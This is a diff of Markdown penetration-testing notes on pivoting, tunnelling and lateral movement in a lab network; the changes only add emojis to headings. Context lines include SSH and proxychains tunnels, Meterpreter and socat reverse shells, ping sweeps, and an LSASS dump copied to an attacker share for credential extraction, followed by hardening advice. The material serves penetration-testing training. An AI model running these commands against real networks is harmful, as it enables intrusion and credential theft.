@@ -24,7 +24,7 @@ Upon first accessing a host, it is critical to perform immediate reconnaissance.
 If a host has multiple network adapters, it is a prime candidate for pivoting to different network segments.
 
 <details>
-<summary><h2>Pivoting</h2></summary>
+<summary><h2>🔄 Pivoting</h2></summary>
 
 Pivoting is the technique of **using a compromised host to gain access to otherwise unreachable networks**, allowing you to discover and engage with new targets on different network segments.
 
@@ -47,7 +47,7 @@ _During one tricky engagement, the target had their network physically and logic
 </details>
 
 <details>
-<summary><h2>Tunneling</h2></summary>
+<summary><h2>🕳️ Tunneling</h2></summary>
 
 Tunneling is a technique used to **encapsulate network traffic within another protocol**. This creates a "tunnel" through a compromised host, allowing you to covertly route traffic and bypass network security controls.
 
@@ -69,7 +69,7 @@ _One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. T
 </details>
 
 <details>
-<summary><h2>Lateral Movement</h2></summary>
+<summary><h2>↔️ Lateral Movement</h2></summary>
 
 Lateral Movement is the technique adversaries use to **progressively explore, access, and control additional hosts, applications, and services within a network environment after gaining an initial foothold**.
 
@@ -98,7 +98,7 @@ _During an assessment, we gained initial access to the target environment and we
 Being able to grasp the concept of pivoting well enough to succeed at it on an engagement requires a solid fundamental understanding of some key networking concepts. This section will be a quick refresher on essential foundational networking concepts to understand pivoting.
 
 <details>
-<summary><h2>IP Addressing & Network Interface Controllers (NICs)</h2></summary>
+<summary><h2>🌐 IP Addressing & Network Interface Controllers (NICs)</h2></summary>
 
 **What is an IP Address?**
 Every computer communicating on a network requires an IP address. Without one, a host is effectively not on the network. This address is a software-assigned identifier, typically obtained in one of two ways:
@@ -124,7 +124,7 @@ Identifying pivoting opportunities is directly dependent on understanding the IP
 **Therefore, one of the first commands to run on a newly compromised host is to check its network configuration:**
 
 <details>
-<summary><h3>Windows Example</h3></summary>
+<summary><h3>🪟 Windows Example</h3></summary>
 
 <table width="100%">
 <tr>
@@ -188,7 +188,7 @@ Ethernet adapter Ethernet:
 </details>
 
 <details>
-<summary><h3>Linux & macOS Example</h3></summary>
+<summary><h3>🐧 Linux & macOS Example</h3></summary>
 
 <table width="100%">
 <tr>
@@ -268,7 +268,7 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 </details>
 
 <details>
-<summary><h2>Routing</h2></summary>
+<summary><h2>🛣️ Routing</h2></summary>
 
 Routing is the process of forwarding packets based on their destination IP. Although people often picture a specialised “router” appliance, **any host can act as a router** if it forwards traffic between interfaces. In pentesting and pivoting you’ll often need a host (pivot) to route traffic into otherwise unreachable networks. Tools like AutoRoute automate adding routes on your attack box so traffic destined for target subnets is forwarded via a pivot host.
 
@@ -339,7 +339,7 @@ Short checklist for pivoting
 </details>
 
 <details>
-<summary><h2>Protocols, Services & Ports</h2></summary>
+<summary><h2>📡 Protocols, Services & Ports</h2></summary>
 
 What they are
 
@@ -373,7 +373,7 @@ Client vs server ports
 Port forwarding is a technique that redirects a communication request from one port to another. It typically relies on TCP to maintain interactive communication, but can also use other encapsulation methods — for example, SSH tunnels or SOCKS proxies — to transport the forwarded traffic. This makes it a powerful method for bypassing firewalls and pivoting through compromised hosts to reach internal networks.
 
 <details>
-<summary><h3>1. Scanning the Pivot Target</h2></summary>
+<summary><h3>🔍 1. Scanning the Pivot Target</h2></summary>
 
 We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.
 
@@ -435,7 +435,7 @@ Why this helps:
 </details>
 
 <details>
-<summary><h3>2. Executing the Local Port Forward</h2></summary>
+<summary><h3>🔌 2. Executing the Local Port Forward</h2></summary>
 
 <table width="100%">
 <tr>
@@ -511,7 +511,7 @@ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
 </details>
 
 <details>
-<summary><h3>3. Confirming Port Forward</h2></summary>
+<summary><h3>✅ 3. Confirming Port Forward</h2></summary>
 
 **Netstat**
 
@@ -611,7 +611,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
 </details>
 
 <details>
-<summary><h3>4. Setting up to Pivot</h2></summary>
+<summary><h3>🔧 4. Setting up to Pivot</h2></summary>
 
 If we type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:
 
@@ -733,7 +733,7 @@ flowchart LR
 In the above image, the attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on localhost:9050. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH.
 
 <details>
-<summary><h3>4.1. Enabling Dynamic Port Forwarding with SSH</h2></summary>
+<summary><h3>🔐 4.1. Enabling Dynamic Port Forwarding with SSH</h2></summary>
 
 The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port **9050**. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's **TCP traffic** to go through hosted proxies like **SOCKS4**/**SOCKS5**, **TOR**, or **HTTP**/**HTTPS** proxies.
 
@@ -760,7 +760,7 @@ ssh -D 9050 ubuntu@10.129.202.64
 </details>
 
 <details>
-<summary><h3>4.2. Checking /etc/proxychains.conf</h2></summary>
+<summary><h3>🔧 4.2. Checking /etc/proxychains.conf</h2></summary>
 
 To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at /etc/proxychains.conf. We can add socks4 127.0.0.1 9050 to the last line if it is not already there.
 
@@ -800,7 +800,7 @@ socks4 	127.0.0.1 9050
 </details>
 
 <details>
-<summary><h3>4.3. Using Nmap with Proxychains</h2></summary>
+<summary><h3>🔍 4.3. Using Nmap with Proxychains</h2></summary>
 
 Now we want to run nmap through that SOCKS proxy using proxychains so scans originate from the pivot host and can reach an otherwise inaccessible subnet (e.g., `172.16.5.0/23`).
 
@@ -868,7 +868,7 @@ _UDP scanning is unreliable (or impossible) over SOCKS in many tools._
 </details>
 
 <details>
-<summary><h3>4.4. Enumerating the Windows Target through Proxychains</h2></summary>
+<summary><h3>🔍 4.4. Enumerating the Windows Target through Proxychains</h2></summary>
 
 So, for this module, we will primarily focus on scanning individual hosts, or smaller ranges of hosts we know are alive, which in this case will be a Windows host at `172.16.5.19`.
 
@@ -942,7 +942,7 @@ The Nmap scan shows several open ports, one of which is RDP port (3389). Similar
 
 </details>
 <details>
-<summary><h3>5. Using Metasploit with Proxychains</h2></summary>
+<summary><h3>💣 5. Using Metasploit with Proxychains</h2></summary>
 
 We can also open Metasploit using proxychains and send all associated traffic through the proxy we have established.
 
@@ -1544,10 +1544,10 @@ flowchart LR
 In some scenarios, we may already have Meterpreter shell access on the Ubuntu server (the pivot host) and want to perform enumeration scans through it while still benefiting from the conveniences that Meterpreter sessions provide. In these cases, we can create a pivot directly through the Meterpreter session without relying on SSH port forwarding.
 
 <details>
-<summary><h3>Method 1. Using a Meterpreter Session</h3></summary>
+<summary><h3>💀 Method 1. Using a Meterpreter Session</h3></summary>
 
 <details>
-<summary><h4>1. Configuring & Starting the multi/handler</h4></summary>
+<summary><h4>⚙️ 1. Configuring & Starting the multi/handler</h4></summary>
 
 We can generate a Meterpreter shell for the Ubuntu server, which will give us a shell on our attack host listening on port 8080.
 
@@ -1768,7 +1768,7 @@ chmod +x shell.elf
 </details>
 
 <details>
-<summary><h4>2. Automatically Adding Routes with Autoroute</h4></summary>
+<summary><h4>🛣️ 2. Automatically Adding Routes with Autoroute</h4></summary>
 
 <table width="100%">
 <tr>
@@ -1818,7 +1818,7 @@ chmod +x shell.elf
 </details>
 
 <details>
-<summary><h4>3. Starting the SOCKS Proxy</h4></summary>
+<summary><h4>🕳️ 3. Starting the SOCKS Proxy</h4></summary>
 
 This allows external tools (proxychains, nmap, etc.) to pivot through Meterpreter.
 
@@ -1858,7 +1858,7 @@ This allows external tools (proxychains, nmap, etc.) to pivot through Meterprete
 </details>
 
 <details>
-<summary><h4>4. Updating proxychains.conf (If Needed)</h4></summary>
+<summary><h4>🔧 4. Updating proxychains.conf (If Needed)</h4></summary>
 
 Once the SOCKS server is running, we can route traffic from tools like **Nmap** through our pivot on the compromised Ubuntu host using **proxychains**. To enable this, we add the following entry to the end of the `/etc/proxychains.conf` file (if it is not already present):
 
@@ -1885,7 +1885,7 @@ grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.
 </details>
 
 <details>
-<summary><h4>5. Scanning Internal Hosts via Meterpreter</h4></summary>
+<summary><h4>🔍 5. Scanning Internal Hosts via Meterpreter</h4></summary>
 
 **Ping Sweep using Meterpreter**
 
@@ -1919,7 +1919,7 @@ grep -qxF "socks4 127.0.0.1 1080" /etc/proxychains.conf || echo "socks4 127.0.0.
 </details>
 
 <details>
-<summary><h4>6. Port Forwarding (Pivoting RDP Through Meterpreter)</h4></summary>
+<summary><h4>🔀 6. Port Forwarding (Pivoting RDP Through Meterpreter)</h4></summary>
 
 **Create a Local Port Forward**
 
@@ -1984,7 +1984,7 @@ nc -v 127.0.0.1 3389
 </details>
 
 <details>
-<summary><h4>7. Connecting to the Internal Windows Host via RDP</h4></summary>
+<summary><h4>🖥️ 7. Connecting to the Internal Windows Host via RDP</h4></summary>
 
 **Use xfreerdp:**
 
@@ -2047,7 +2047,7 @@ Once accepted, you will gain full RDP access to the internal host.
 </details>
 
 <details>
-<summary><h3>Method 2. Using SOCKS proxy to pivot</h3></summary>
+<summary><h3>🕳️ Method 2. Using SOCKS proxy to pivot</h3></summary>
 
 </details>
 
@@ -2061,7 +2061,7 @@ Once accepted, you will gain full RDP access to the internal host.
 <summary><h1>🏓 Playing Pong with Socat</h1></summary>
 
 <details>
-<summary><h2>Socat redirection with a Reverse Shell</h2></summary>
+<summary><h2>🔌 Socat redirection with a Reverse Shell</h2></summary>
 
 Socat is a bidirectional relay tool that creates pipe sockets between two independent network channels without using SSH tunneling. It functions as a redirector that listens on one host and port and forwards data to another IP address and port.
 
@@ -2283,7 +2283,7 @@ meterpreter > getuid
 </details>
 
 <details>
-<summary><h2>Socat redirection with a Bind Shell</h2></summary>
+<summary><h2>🔌 Socat redirection with a Bind Shell</h2></summary>
 
 A socat bind shell redirector can be created similarly to a reverse shell redirector. This differs from reverse shells, which connect from the Windows server to the Ubuntu server and get redirected to the attack host. For bind shells, the Windows server starts a listener and binds to a specific port. A socat redirector can be created on the Ubuntu server to listen for incoming connections from a Metasploit bind handler and forward them to the bind shell payload on the Windows target.
 
@@ -2468,7 +2468,7 @@ meterpreter > getuid
 <summary><h1>🏓 Pivoting Around Obstacles</h1></summary>
 
 <details>
-<summary><h2>SSH for Windows: plink.exe</h2></summary>
+<summary><h2>🪟 SSH for Windows: plink.exe</h2></summary>
 
 Plink (PuTTY Link) is a command-line SSH tool for Windows included with the PuTTY package.
 
@@ -2555,7 +2555,7 @@ flowchart TB
 </details>
 
 <details>
-<summary><h3>1. Plink Usage</h3></summary>
+<summary><h3>🔌 1. Plink Usage</h3></summary>
 
 The Windows attack host starts a plink.exe process to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
 
@@ -2584,7 +2584,7 @@ plink -ssh -D 9050 ubuntu@10.129.15.50
 </details>
 
 <details>
-<summary><h3>2. Introducing Proxifier</h3></summary>
+<summary><h3>🔧 2. Introducing Proxifier</h3></summary>
 
 Proxifier is another Windows-based tool that can establish a SOCKS tunnel through the SSH session previously created.
 
@@ -2604,7 +2604,7 @@ You can create a Proxifier profile that specifies:
 </details>
 
 <details>
-<summary><h3>3. Starting an RDP Session Through the Tunnel</h3></summary>
+<summary><h3>🖥️ 3. Starting an RDP Session Through the Tunnel</h3></summary>
 
 Once the SOCKS server is configured (127.0.0.1:9050), you can directly launch:
 
@@ -2635,7 +2635,7 @@ This starts an RDP session with a Windows target that permits RDP connections, u
 </details>
 
 <details>
-<summary><h2>SSH Pivoting with Sshuttle</h2></summary>
+<summary><h2>🚇 SSH Pivoting with Sshuttle</h2></summary>
 
 **[Sshuttle](https://github.com/sshuttle/sshuttle)** is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
 
@@ -2854,7 +2854,7 @@ We can now use any tool directly without using proxychains.
 </details>
 
 <details>
-<summary><h2>Web Server Pivoting with Rpivot</h2></summary>
+<summary><h2>🌐 Web Server Pivoting with Rpivot</h2></summary>
 
 **[Rpivot](https://github.com/klsecservices/rpivot)** is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.
 
@@ -3047,7 +3047,7 @@ python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --n
 </details>
 
 <details>
-<summary><h2>Port Forwarding with Windows Netsh</h2></summary>
+<summary><h2>🪟 Port Forwarding with Windows Netsh</h2></summary>
 
 **[Netsh](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)** is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
 
@@ -3226,7 +3226,7 @@ xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 <summary><h1>🌿 Branching Out Our Tunnels</h1></summary>
 
 <details>
-<summary><h2>DNS Tunneling with Dnscat2</h2></summary>
+<summary><h2>🌐 DNS Tunneling with Dnscat2</h2></summary>
 
 Dnscat2 is a tunneling tool designed to establish an encrypted Command and Control (C2) channel between two hosts (attacker server and victim client) using the fundamental DNS protocol.
 
@@ -3498,7 +3498,7 @@ exec (OFFICEMANAGER) 1>
 </details>
 
 <details>
-<summary><h2>SOCKS5 Tunneling with Chisel</h2></summary>
+<summary><h2>🕳️ SOCKS5 Tunneling with Chisel</h2></summary>
 
 Chisel is a fast TCP/UDP tunneling tool written in Go. It encapsulates traffic within HTTP and secures it via SSH, making it ideal for bypassing strict firewall rules that only allow web traffic.
 
@@ -3742,7 +3742,7 @@ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
 </details>
 
 <details>
-<summary><h2>ICMP Tunneling with SOCKS</h2></summary>
+<summary><h2>🔌 ICMP Tunneling with SOCKS</h2></summary>
 
 **ICMP Tunneling Overview:** A technique that encapsulates traffic within ICMP echo requests and responses. It requires the firewall to permit outbound ICMP traffic (pings) to external servers.
 
@@ -3978,7 +3978,7 @@ xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore
 </details>
 
 <details>
-<summary><h2>RDP and SOCKS Tunneling with SocksOverRDP</h2></summary>
+<summary><h2>🖥️ RDP and SOCKS Tunneling with SocksOverRDP</h2></summary>
 
 This method leverages **Dynamic Virtual Channels (DVC)** from the Windows Remote Desktop Service to tunnel traffic. It is an excellent alternative when SSH access is restricted or unavailable within a Windows network.
 
@@ -4239,10 +4239,10 @@ A team member started a Penetration Test against the Inlanefreight environment b
 - Grab **any/all** flags that can be found.
 
 <details>
-<summary><h2>Steps</h2></summary>
+<summary><h2>🏆 Steps</h2></summary>
 
 <details>
-<summary><h3>Step 1 - Initial Reconnaissance & SSH Key Extraction</h3></summary>
+<summary><h3>🔍 Step 1 - Initial Reconnaissance & SSH Key Extraction</h3></summary>
 
 We start the engagement in the initial information gathering (reconnaissance) phase. By accessing the exposed web shell, our primary goal is to find valid access vectors to move laterally or establish persistence on the network.
 
@@ -4424,7 +4424,7 @@ MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=
 </details>
 
 <details>
-<summary><h3>Step 2 - Securing the SSH Private Key</h3></summary>
+<summary><h3>🔑 Step 2 - Securing the SSH Private Key</h3></summary>
 
 **Copy the contents to our attack box**
 
@@ -4457,7 +4457,7 @@ chmod 600 id_rsa
 </details>
 
 <details>
-<summary><h3>Step 3 - Establishing SSH Tunnel & Dynamic Port Forwarding</h3></summary>
+<summary><h3>🔐 Step 3 - Establishing SSH Tunnel & Dynamic Port Forwarding</h3></summary>
 
 **Establish SSH Session with Dynamic Port Forwarding**
 
@@ -4504,7 +4504,7 @@ webadmin@inlanefreight:~$
 </details>
 
 <details>
-<summary><h3>Step 4 - Internal Network Enumeration & Host Discovery</h3></summary>
+<summary><h3>🔍 Step 4 - Internal Network Enumeration & Host Discovery</h3></summary>
 
 **Internal Network Interface Enumeration**
 
@@ -4603,7 +4603,7 @@ for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "64 bytes" &); done
 </details>
 
 <details>
-<summary><h3>Step 5 - Internal Service Enumeration via SOCKS Proxy</h3></summary>
+<summary><h3>🔍 Step 5 - Internal Service Enumeration via SOCKS Proxy</h3></summary>
 
 We need to scan the newly discovered Windows machine for accessible services, but since it resides on an internal network, we must route our scanning tools through the SSH tunnel we created.
 
@@ -4731,7 +4731,7 @@ for port in 22 80 135 139 445 3389; do proxychains nc -zv 172.16.5.35 $port 2>&1
 </details>
 
 <details>
-<summary><h3>Step 6 - First Pivot: RDP Access via SSH Tunnel</h3></summary>
+<summary><h3>🔀 Step 6 - First Pivot: RDP Access via SSH Tunnel</h3></summary>
 
 We leverage our established SSH proxy and the harvested credentials to gain a graphical Remote Desktop (RDP) session on the internal Windows server.
 
@@ -4780,7 +4780,7 @@ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /cert:ignor
 </details>
 
 <details>
-<summary><h3>Step 7 - Post-Exploitation: First Internal Flag Retrieval</h3></summary>
+<summary><h3>🏁 Step 7 - Post-Exploitation: First Internal Flag Retrieval</h3></summary>
 
 Now that we have successfully landed on the target Windows machine through our RDP session, we move to secure our objective for this phase of the engagement.
 
@@ -4822,7 +4822,7 @@ type C:\Flag.txt
 </details>
 
 <details>
-<summary><h3>Step 8 - Exfiltrating LSASS Dump via RDP Shared Drive</h3></summary>
+<summary><h3>💀 Step 8 - Exfiltrating LSASS Dump via RDP Shared Drive</h3></summary>
 
 Our next objective is to harvest credentials to fuel our next jump deeper into the network. To achieve this, we target the Local Security Authority Subsystem Service (LSASS), which handles active user authentication and stores credentials in memory.
 
@@ -4877,7 +4877,7 @@ copy C:\Users\mlefay\AppData\Local\Temp\lsass.DMP \\tsclient\kali_share\
 </details>
 
 <details>
-<summary><h3>Step 9 - Offline Credential Extraction via Pypykatz</h3></summary>
+<summary><h3>🔓 Step 9 - Offline Credential Extraction via Pypykatz</h3></summary>
 
 We analyze the exfiltrated LSASS memory dump offline on our attack host to safely extract compromised credentials.
 
@@ -4962,7 +4962,7 @@ We scan the parsed memory sections and identify an active logon session for a ne
 </details>
 
 <details>
-<summary><h3>Step 10 - Second Pivot Reconnaissance & Target Identification</h3></summary>
+<summary><h3>🔍 Step 10 - Second Pivot Reconnaissance & Target Identification</h3></summary>
 
 We need to map out the next layer of the internal network from our new vantage point on the compromised Windows server.
 
@@ -5149,7 +5149,7 @@ DNS request timed out.
 </details>
 
 <details>
-<summary><h3>Step 11 - Deep Internal Network Scanning & Service Discovery</h3></summary>
+<summary><h3>🔍 Step 11 - Deep Internal Network Scanning & Service Discovery</h3></summary>
 
 We continue our reconnaissance of the newly discovered `172.16.6.0/24` subnet. Since we do not have our standard scanning tools (like Nmap) available on this compromised Windows server, we must "Live off the Land" using built-in operating system commands.
 
@@ -5231,7 +5231,7 @@ for /L %i in (1,1,254) do @powershell -c "if ((New-Object System.Net.Sockets.Tcp
 </details>
 
 <details>
-<summary><h3>Step 12 - Executing the Double Pivot via Nested RDP</h3></summary>
+<summary><h3>🔀 Step 12 - Executing the Double Pivot via Nested RDP</h3></summary>
 
 We need to log into the newly discovered target (`172.16.6.25`) using the `vfrank` credentials we extracted earlier, but doing this from an already compromised command line requires a specific workaround.
 
@@ -5298,7 +5298,7 @@ mstsc /v:172.16.6.25
 </details>
 
 <details>
-<summary><h3>Step 13 - Post-Exploitation: Second Internal Flag Retrieval</h3></summary>
+<summary><h3>🏁 Step 13 - Post-Exploitation: Second Internal Flag Retrieval</h3></summary>
 
 Having successfully established our nested RDP session and landed on the secondary internal host, our immediate priority is to verify our access and secure the objective for this specific machine.
 
@@ -5340,7 +5340,7 @@ type C:\Flag.txt
 </details>
 
 <details>
-<summary><h3>Step 14 - Final Assault: Domain Controller Compromise via SMB</h3></summary>
+<summary><h3>💥 Step 14 - Final Assault: Domain Controller Compromise via SMB</h3></summary>
 
 We are now ready for the final assault on the Domain Controller (172.16.10.5), which we identified during our earlier DNS enumeration.
 
@@ -5432,7 +5432,7 @@ type \\172.16.10.5\c$\Flag.txt.txt
 </details>
 
 <details>
-<summary><h2>Summary</h2></summary>
+<summary><h2>📋 Summary</h2></summary>
 
 ```mermaid
 flowchart TD
@@ -5502,7 +5502,7 @@ These remediations typically involve:
 This section will cover some of these fixes and outline what they mean both for us as attackers and for those in charge of defending the network.
 
 <details>
-<summary><h2>Setting a Baseline
+<summary><h2>📏 Setting a Baseline
 </h2></summary>
 
 Understanding everything present and happening in a network environment is vital. As defenders, we should be able to quickly **identify** and **investigate**:
@@ -5535,13 +5535,13 @@ Lastly, for our baseline, understanding what assets are critical to the operatio
 </details>
 
 <details>
-<summary><h2>People, Processes, and Technology
+<summary><h2>👥 People, Processes, and Technology
 </h2></summary>
 
 Network hardening can be organized into the categories **People**, **Process**, and **Technology**. These hardening measures will encompass the hardware, software, and human aspects of any network.
 
 <details>
-<summary><h3>People
+<summary><h3>👥 People
 </h3></summary>
 
 In even the most hardened environment, users are often considered the weakest link. Enforcing security best practices for standard users and administrators will prevent "easy wins" for pentesters and malicious attackers. We should also strive to keep ourselves and the users we serve educated and aware of threats. The measures below are a great way to begin the process of securing the human element of any enterprise environment.
@@ -5565,7 +5565,7 @@ The organization has a limited ability to administer and secure a personally own
 </details>
 
 <details>
-<summary><h3>Processes
+<summary><h3>⚙️ Processes
 </h3></summary>
 
 Maintaining and enforcing policies and procedures can significantly impact an organization's overall security posture. It is near impossible to hold an organization's employees accountable without defined policies. It makes it challenging to respond to an incident without defined and practiced procedures such as a disaster recovery plan.
@@ -5585,7 +5585,7 @@ The items below can help to start defining an organization's processes, policies
 </details>
 
 <details>
-<summary><h3>Technology
+<summary><h3>🔧 Technology
 </h3></summary>
 
 Periodically check the network for legacy misconfigurations and new & emerging threats. As changes are made to an environment, ensure that common misconfigurations are not introduced while paying attention to any vulnerabilities introduced by tools or applications utilized in the environment.
@@ -5597,7 +5597,7 @@ If possible, attempt to patch or mitigate those risks with the understanding tha
 </details>
 
 <details>
-<summary><h2>From the Outside Moving In
+<summary><h2>🌐 From the Outside Moving In
 </h2></summary>
 
 When working with an organization to help them assess the security posture of their environment, it can be helpful to start from the outside and move our way in. As penetration testers and security practitioners, we want our clients to take our findings and recommendations seriously enough to inform their decisions moving forward. We want them to understand that the issues we uncover can also be found by individuals or groups with less honorable intentions.
@@ -5605,7 +5605,7 @@ When working with an organization to help them assess the security posture of th
 Let's consider this through a mental exercise using the outline below. Feel free to use these burning questions and considerations to start a conversation with friends, team-members or if you are alone, take some notes and come up with the most secure design you can think of:
 
 <details>
-<summary><h3>Perimeter First
+<summary><h3>🔍 Perimeter First
 </h3></summary>
 
 - What exactly are we protecting?
@@ -5631,7 +5631,7 @@ When considering these questions regarding the perimeter, we may face the realit
 </details>
 
 <details>
-<summary><h3>Internal Considerations
+<summary><h3>🏠 Internal Considerations
 </h3></summary>
 
 Many of the questions we ask for external considerations apply to our internal environment. There are a few differences; however, there are many different routes for ensuring the successful defense of our networks. Let's consider the following:
@@ -5653,7 +5653,7 @@ Combine that with adequate network segmentation, and it becomes infinitely more 
 </details>
 
 <details>
-<summary><h2>MITRE Breakdown
+<summary><h2>🔬 MITRE Breakdown
 </h2></summary>
 
 As a different look at this, we have broken down the major actions we practice in this module and mapped controls based on the TTP and a MITRE tag. Each tag corresponds with a section of the Enterprise ATT&CK Matrix found here. Any tag marked as **TA** corresponds to an overarching tactic, while a tag marked as **T###** is a technique found in the matrix under tactics.
